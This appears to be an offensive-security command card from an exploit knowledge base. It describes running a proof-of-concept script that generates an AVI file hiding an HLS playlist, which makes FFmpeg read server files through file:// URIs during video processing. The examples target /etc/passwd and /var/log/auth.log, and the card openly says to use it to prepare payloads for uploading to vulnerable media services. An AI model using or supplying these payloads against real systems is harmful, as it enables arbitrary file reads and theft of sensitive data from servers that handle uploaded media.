---
type: command
executor: bash
data: './gen_xbin_avi.py file://$_TARGET_FILE $_OUTPUT_AVI'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - exploits
  - ffmpeg
  - hls
verified: true
validated: true
---

# Generate Malicious AVI Embedding Target File URI

## Command

```bash
./gen_xbin_avi.py file://$_TARGET_FILE $_OUTPUT_AVI
```

## Description

Runs a proof-of-concept Python script to generate an AVI video file containing an embedded malicious HLS playlist. The playlist references a target file URI using the file:// protocol, which will be processed by FFmpeg to read the file during video handling. Use this to prepare payloads for uploading to vulnerable media services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| file://$_TARGET_FILE | URI pointing to the target file on the server (e.g., file:///etc/passwd) | Yes |
| $_OUTPUT_AVI | Name of the output AVI file to generate (e.g., file_read.avi) | Yes |

## Examples

### Basic Usage

```bash
./gen_xbin_avi.py file:///etc/passwd file_read.avi
```

### Advanced Usage

```bash
./gen_xbin_avi.py file:///var/log/auth.log custom_malicious.avi
```

## Expected Output

The command runs without stdout output if successful, creating the $_OUTPUT_AVI file. Check file creation with `ls $_OUTPUT_AVI`. The AVI appears as a valid video file but contains the hidden HLS payload.

## Related

- [[procedures/Exploit-FFmpeg-HLS-Vulnerability-via-Malicious-AVI-for-Arbitrary-File-Read]]
